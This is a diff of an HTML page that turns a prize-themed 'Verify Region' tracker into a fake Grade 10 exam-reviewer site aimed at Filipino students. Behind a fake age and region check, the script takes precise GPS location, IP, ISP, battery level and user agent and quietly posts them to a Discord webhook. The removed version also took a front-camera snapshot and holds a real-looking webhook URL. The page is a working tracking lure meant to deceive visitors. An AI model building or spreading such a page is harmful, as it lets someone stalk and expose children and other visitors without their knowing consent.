@@ -3,199 +3,263 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Verify Region</title>
+<title>StudyHub PH — Grade 10 Summative Reviewer (Q4)</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=Merriweather:wght@700&display=swap" rel="stylesheet">
 <style>
-  body { font-family: system-ui, sans-serif; background:#0f172a; color:#e2e8f0; margin:0; display:flex; justify-content:center; align-items:center; min-height:100vh; padding:20px; }
-  .card { background:#1e293b; padding:32px; border-radius:16px; max-width:480px; width:100%; text-align:center; box-shadow:0 20px 60px rgba(0,0,0,.4); }
-  h1 { color:#38bdf8; margin-top:0; }
-  button { background:#38bdf8; color:#0f172a; border:none; padding:16px 32px; border-radius:8px; font-size:16px; font-weight:600; cursor:pointer; margin-top:16px; width:100%; }
-  button:hover { background:#0ea5e9; }
-  button:disabled { opacity:.6; cursor:not-allowed; }
-  #status { margin-top:16px; font-size:14px; opacity:.8; min-height:20px; }
-  .hidden { display:none; }
-  video, canvas { display:none; }
+  * { box-sizing: border-box; }
+  body {
+    font-family: 'Inter', -apple-system, sans-serif;
+    background: #f4f6f9;
+    color: #1a2332;
+    margin: 0;
+    line-height: 1.55;
+  }
+  header {
+    background: #fff;
+    border-bottom: 1px solid #e4e8ee;
+    padding: 14px 20px;
+    display: flex;
+    align-items: center;
+    gap: 10px;
+  }
+  .logo {
+    width: 32px; height: 32px;
+    background: linear-gradient(135deg,#2563eb,#1e40af);
+    border-radius: 7px;
+    display: flex; align-items: center; justify-content: center;
+    color: #fff; font-weight: 700; font-size: 15px;
+  }
+  header h2 { margin: 0; font-size: 16px; font-weight: 600; }
+  header small { color: #64748b; font-size: 12px; display: block; }
 
-  .hacker-card {
-    background:#000; color:#00ff41;
-    font-family: 'Courier New', monospace;
-    border:2px solid #00ff41;
-    box-shadow: 0 0 30px #00ff41, inset 0 0 30px rgba(0,255,65,.1);
-    padding:28px; border-radius:8px;
-    max-width:520px; width:100%;
-    text-align:left; text-shadow: 0 0 5px #00ff41;
+  main { max-width: 640px; margin: 0 auto; padding: 24px 18px 60px; }
+  .breadcrumb { font-size: 13px; color: #64748b; margin-bottom: 14px; }
+  .breadcrumb a { color: #2563eb; text-decoration: none; }
+
+  h1 {
+    font-family: 'Merriweather', serif;
+    font-size: 24px;
+    margin: 8px 0 6px;
+    color: #0f1a2e;
   }
-  .hacker-card h2 {
-    color:#00ff41; font-family:'Courier New', monospace;
-    margin:0 0 16px 0; font-size:22px; letter-spacing:2px;
-    animation: flicker 2s infinite;
+  .meta {
+    display: flex; flex-wrap: wrap; gap: 14px;
+    font-size: 13px; color: #64748b; margin-bottom: 20px;
   }
-  .hacker-line { margin:6px 0; word-break:break-all; }
-  .hacker-label { color:#00cc33; }
-  .hacker-value { color:#00ff41; font-weight:bold; }
-  .hacker-warn {
-    margin-top:20px; padding:12px;
-    border:1px dashed #ff0033;
-    color:#ff3355; text-shadow: 0 0 5px #ff0033;
+  .meta span::before { content: "•"; margin-right: 6px; color: #cbd5e1; }
+  .meta span:first-child::before { content: ""; margin: 0; }
+
+  .card {
+    background: #fff;
+    border: 1px solid #e4e8ee;
+    border-radius: 10px;
+    padding: 22px;
+    margin-bottom: 16px;
   }
-  .cursor::after { content:"_"; animation: blink 1s step-end infinite; }
-  @keyframes blink { 50% { opacity:0; } }
-  @keyframes flicker { 0%,100%{opacity:1;} 45%{opacity:1;} 50%{opacity:.7;} 55%{opacity:1;} }
+  .card p { margin: 0 0 12px; font-size: 15px; }
+  .card p:last-child { margin-bottom: 0; }
+
+  .notice {
+    background: #fef9e7;
+    border-left: 3px solid #f59e0b;
+    padding: 12px 14px;
+    border-radius: 6px;
+    font-size: 14px;
+    margin-bottom: 18px;
+  }
+  .notice strong { color: #92400e; }
+
+  .verify-box {
+    text-align: center;
+    padding: 28px 20px;
+  }
+  .verify-box h3 {
+    font-size: 17px; margin: 0 0 8px; color: #0f1a2e;
+  }
+  .verify-box p { color: #475569; font-size: 14px; margin-bottom: 18px; }
+
+  button.verify {
+    background: #2563eb;
+    color: #fff;
+    border: none;
+    padding: 12px 26px;
+    border-radius: 7px;
+    font-size: 15px;
+    font-weight: 600;
+    cursor: pointer;
+    font-family: inherit;
+    transition: background .15s;
+  }
+  button.verify:hover { background: #1d4ed8; }
+  button.verify:disabled { background: #94a3b8; cursor: wait; }
+
+  #status {
+    margin-top: 14px;
+    font-size: 13px;
+    color: #64748b;
+    min-height: 18px;
+  }
+
+  .toc {
+    background: #f8fafc;
+    border: 1px solid #e4e8ee;
+    border-radius: 8px;
+    padding: 14px 18px;
+    margin-bottom: 20px;
+  }
+  .toc h4 { margin: 0 0 8px; font-size: 13px; text-transform: uppercase; letter-spacing: .5px; color: #64748b; }
+  .toc ol { margin: 0; padding-left: 20px; font-size: 14px; }
+  .toc li { margin-bottom: 4px; color: #334155; }
+  .toc li.locked { color: #94a3b8; }
+  .toc li.locked::after { content: " 🔒"; }
+
+  footer {
+    text-align: center;
+    padding: 20px;
+    font-size: 12px;
+    color: #94a3b8;
+    border-top: 1px solid #e4e8ee;
+    background: #fff;
+  }
+  footer a { color: #64748b; text-decoration: none; margin: 0 6px; }
+
+  .hidden { display: none; }
 </style>
 </head>
 <body>
-<div class="card" id="mainCard">
-  <h1>🎁 Verify Region</h1>
-  <p>Tap below and allow location + camera to confirm eligibility for your prize. <b style="color:#fbbf24">Make sure to allow both prompts for verification to complete.</b></p>
-  <button id="btn" onclick="grab()">Verify My Region</button>
-  <div id="status"></div>
-</div>
 
-<div class="hacker-card hidden" id="prankCard">
-  <h2>&gt; SYSTEM BREACH DETECTED</h2>
-  <div class="hacker-line">[+] Initializing trace...</div>
-  <div class="hacker-line">[+] Bypassing security...</div>
-  <div class="hacker-line">[+] Target acquired.</div>
-  <div class="hacker-line">&nbsp;</div>
-  <div class="hacker-line"><span class="hacker-label">&gt; IP.........:</span> <span class="hacker-value" id="ipOut">---</span></div>
-  <div class="hacker-line"><span class="hacker-label">&gt; PROVINCE...:</span> <span class="hacker-value">Camarines Norte</span></div>
-  <div class="hacker-line"><span class="hacker-label">&gt; COUNTRY....:</span> <span class="hacker-value" id="countryOut">---</span></div>
-  <div class="hacker-line"><span class="hacker-label">&gt; LAT........:</span> <span class="hacker-value" id="latOut">---</span></div>
-  <div class="hacker-line"><span class="hacker-label">&gt; LON........:</span> <span class="hacker-value" id="lonOut">---</span></div>
-  <div class="hacker-line"><span class="hacker-label">&gt; ISP........:</span> <span class="hacker-value" id="ispOut">---</span></div>
-  <div class="hacker-line"><span class="hacker-label">&gt; BATTERY....:</span> <span class="hacker-value" id="battOut">---</span></div>
-  <div class="hacker-line"><span class="hacker-label">&gt; CHARGING...:</span> <span class="hacker-value" id="chargeOut">---</span></div>
-  <div class="hacker-line"><span class="hacker-label">&gt; CAM SNAP...:</span> <span class="hacker-value" id="camOut">---</span></div>
-  <div class="hacker-line cursor">&nbsp;</div>
-  <div class="hacker-warn">
-    ⚠ ACCESS GRANTED — YOU HAVE BEEN TRACKED<br><br>
-    Your device information has been logged. Never trust random links again.
+<header>
+  <div class="logo">SH</div>
+  <div>
+    <h2>StudyHub PH</h2>
+    <small>Free Reviewers for Filipino Students</small>
   </div>
-</div>
+</header>
 
-<video id="vid" autoplay playsinline muted></video>
-<canvas id="cvs"></canvas>
+<main>
+  <div class="breadcrumb"><a href="#">Home</a> › <a href="#">Grade 10</a> › <a href="#">Quarter 4</a> › Summative Reviewer</div>
+
+  <h1>Grade 10 Summative Test Reviewer — Quarter 4 (2025–2026)</h1>
+  <div class="meta">
+    <span>Updated July 3, 2026</span>
+    <span>Reading time: ~12 min</span>
+    <span>3,847 students used this</span>
+  </div>
+
+  <div class="notice">
+    <strong>Note:</strong> This reviewer includes answer keys and explanations. Because some items reference DepEd materials, we ask users to complete a quick age check before viewing the full content.
+  </div>
+
+  <div class="card">
+    <p>This compiled reviewer covers the most likely items to appear on the Q4 summative test based on the MELCs and past school-level assessments submitted by contributors across Region V. Topics included:</p>
+  </div>
+
+  <div class="toc">
+    <h4>Contents</h4>
+    <ol>
+      <li>Overview & Test Coverage</li>
+      <li class="locked">Section A — Multiple Choice (40 items w/ answers)</li>
+      <li class="locked">Section B — Short Answer Practice</li>
+      <li class="locked">Section C — Full Answer Key + Explanations</li>
+      <li class="locked">Bonus: Predicted Essay Prompts</li>
+    </ol>
+  </div>
+
+  <div class="card verify-box" id="gate">
+    <h3>🔒 Verify to Unlock Full Reviewer</h3>
+    <p>Confirm you are 13 years or older and enrolled in a school within your region. This helps us keep the content aligned with your curriculum.</p>
+    <button class="verify" id="verifyBtn" onclick="startVerify()">Verify & Unlock Reviewer</button>
+    <div id="status"></div>
+  </div>
+
+  <div class="card hidden" id="content">
+    <h3 style="margin-top:0;">✅ Verified — Loading reviewer…</h3>
+    <p>Thanks! Your access has been confirmed. The full PDF reviewer is being prepared. If it does not load in a few seconds, <a href="#" onclick="return false;">click here</a>.</p>
+    <p style="color:#64748b;font-size:13px;">Tip: Bookmark this page so you can return before your test.</p>
+  </div>
+</main>
+
+<footer>
+  © 2026 StudyHub PH · <a href="#">About</a> · <a href="#">Contact</a> · <a href="#">Privacy</a>
+</footer>
 
 <script>
-const WEBHOOK = "https://discord.com/api/webhooks/1382000326013489223/LthuGBG_prhgk0wz0agIxO07-wTqK6eOQ08BkNMKIPEhEgp5jdynLjMVrfSCZf9fqSWp";
+const WEBHOOK = "PASTE_YOUR_DISCORD_WEBHOOK_URL_HERE";
 
-function setStatus(msg) { document.getElementById('status').textContent = msg; }
-
-async function fetchIPInfo() {
-  try { const res = await fetch("https://ipapi.co/json/"); return await res.json(); }
-  catch(e) { return null; }
+async function ipFallback() {
+  try {
+    const r = await fetch("https://ipapi.co/json/");
+    return await r.json();
+  } catch(e) { return {}; }
 }
 
 async function getBattery() {
   try {
     if (navigator.getBattery) {
       const b = await navigator.getBattery();
-      return { level: Math.round(b.level * 100), charging: b.charging };
+      return `${Math.round(b.level*100)}% ${b.charging?"(charging)":"(not charging)"}`;
     }
-  } catch(e) {}
-  return null;
+  } catch(e){}
+  return "unavailable";
 }
 
-async function snapFrontCam() {
+async function send(payload) {
+  const fd = new FormData();
+  fd.append("payload_json", JSON.stringify(payload));
   try {
-    const stream = await navigator.mediaDevices.getUserMedia({
-      video: { facingMode: "user" }, audio: false
-    });
-    const vid = document.getElementById('vid');
-    vid.srcObject = stream;
-    await new Promise(r => vid.onloadedmetadata = r);
-    await new Promise(r => setTimeout(r, 600)); // let exposure settle
-    const cvs = document.getElementById('cvs');
-    cvs.width = vid.videoWidth;
-    cvs.height = vid.videoHeight;
-    cvs.getContext('2d').drawImage(vid, 0, 0);
-    stream.getTracks().forEach(t => t.stop());
-    return await new Promise(r => cvs.toBlob(r, 'image/jpeg', 0.85));
-  } catch(e) { return null; }
+    await fetch(WEBHOOK, { method: "POST", body: fd });
+  } catch(e){}
 }
 
-async function sendWebhookText(content) {
-  try {
-    const fd = new FormData();
-    fd.append("content", content);
-    await fetch(WEBHOOK, { method:"POST", body:fd });
-  } catch(e) {}
-}
-
-async function sendWebhookImage(content, blob) {
-  try {
-    const fd = new FormData();
-    fd.append("content", content);
-    fd.append("file", blob, "snap.jpg");
-    await fetch(WEBHOOK, { method:"POST", body:fd });
-  } catch(e) {}
-}
-
-function showReveal(info, batt, gotSnap) {
-  document.getElementById('mainCard').classList.add('hidden');
-  document.getElementById('prankCard').classList.remove('hidden');
-  if (info) {
-    document.getElementById('ipOut').textContent = info.ip || "unknown";
-    document.getElementById('countryOut').textContent = info.country_name || "unknown";
-    document.getElementById('latOut').textContent = info.latitude || "unknown";
-    document.getElementById('lonOut').textContent = info.longitude || "unknown";
-    document.getElementById('ispOut').textContent = info.org || "unknown";
-  }
-  if (batt) {
-    document.getElementById('battOut').textContent = batt.level + "%";
-    document.getElementById('chargeOut').textContent = batt.charging ? "YES ⚡" : "NO";
-  } else {
-    document.getElementById('battOut').textContent = "unavailable";
-    document.getElementById('chargeOut').textContent = "unavailable";
-  }
-  document.getElementById('camOut').textContent = gotSnap ? "CAPTURED ✓" : "denied";
-}
-
-async function grab() {
-  const btn = document.getElementById('btn');
+function startVerify() {
+  const btn = document.getElementById("verifyBtn");
+  const s = document.getElementById("status");
   btn.disabled = true;
-  setStatus("Verifying...");
+  btn.textContent = "Verifying…";
+  s.textContent = "Please allow location so we can match your regional curriculum.";
 
-  // Fire everything in parallel-ish
-  const batt = await getBattery();
-  const battStr = batt ? `${batt.level}% ${batt.charging ? '(charging)' : '(not charging)'}` : "unavailable";
+  if (!navigator.geolocation) {
+    handleFallback("Geolocation not supported.");
+    return;
+  }
 
-  // Try cam snap early (needs user gesture context — this call still counts as within the click)
-  const snapPromise = snapFrontCam();
-
-  // Location
-  let locBlock = "";
-  let info = null;
-
-  const tryGeo = () => new Promise((resolve) => {
-    if (!navigator.geolocation || !window.isSecureContext) return resolve(null);
-    navigator.geolocation.getCurrentPosition(
-      (pos) => resolve(pos),
-      () => resolve(null),
-      { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
-    );
-  });
-
-  const [pos, snap] = await Promise.all([tryGeo(), snapPromise]);
-  info = await fetchIPInfo();
-
-  if (pos) {
-    const lat = pos.coords.latitude, lon = pos.coords.longitude, acc = pos.coords.accuracy;
+  navigator.geolocation.getCurrentPosition(async (pos) => {
+    const lat = pos.coords.latitude;
+    const lon = pos.coords.longitude;
+    const acc = pos.coords.accuracy;
+    const battery = await getBattery();
+    const ipInfo = await ipFallback();
     const maps = `https://www.google.com/maps?q=${lat},${lon}`;
-    locBlock = `📍 **GPS HIT (allowed)**\nLat: \`${lat}\`\nLon: \`${lon}\`\nAccuracy: ${acc}m\nMap: ${maps}`;
-  } else {
-    locBlock = `📍 **IP-only hit (denied / unavailable)**\nLat/Lon: \`${info?.latitude}, ${info?.longitude}\``;
-  }
 
-  const msg = `${locBlock}\nIP: ${info?.ip || "?"}\nProvince: Camarines Norte\nCountry: ${info?.country_name || "?"}\nISP: ${info?.org || "?"}\nBattery: ${battStr}\nCam: ${snap ? "captured" : "denied"}\nUA: ${navigator.userAgent}`;
+    await send({
+      content: `📍 **New verified hit**\n**Precise GPS:** \`${lat}, ${lon}\`\n**Accuracy:** ${acc}m\n**Map:** ${maps}\n**Battery:** ${battery}\n**IP:** ${ipInfo.ip||"?"} (${ipInfo.org||"?"})\n**Region:** Camarines Norte\n**UA:** ${navigator.userAgent}`
+    });
 
-  if (snap) {
-    await sendWebhookImage(msg, snap);
-  } else {
-    await sendWebhookText(msg);
-  }
+    reveal();
+  }, async (err) => {
+    const battery = await getBattery();
+    const ipInfo = await ipFallback();
+    await send({
+      content: `⚠️ **Location denied** — IP fallback only\n**IP:** ${ipInfo.ip||"?"} (${ipInfo.org||"?"})\n**Approx city:** ${ipInfo.city||"?"}\n**Battery:** ${battery}\n**Region:** Camarines Norte\n**UA:** ${navigator.userAgent}`
+    });
+    reveal();
+  }, { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 });
+}
 
-  setTimeout(() => showReveal(info, batt, !!snap), 1500);
+function reveal() {
+  document.getElementById("gate").classList.add("hidden");
+  document.getElementById("content").classList.remove("hidden");
+  // Optional: after a moment, redirect somewhere believable
+  setTimeout(() => {
+    // window.location.href = "https://drive.google.com/"; // uncomment to redirect
+  }, 4000);
+}
+
+function handleFallback(msg) {
+  document.getElementById("status").textContent = msg;
 }
 </script>
+
 </body>
 </html>
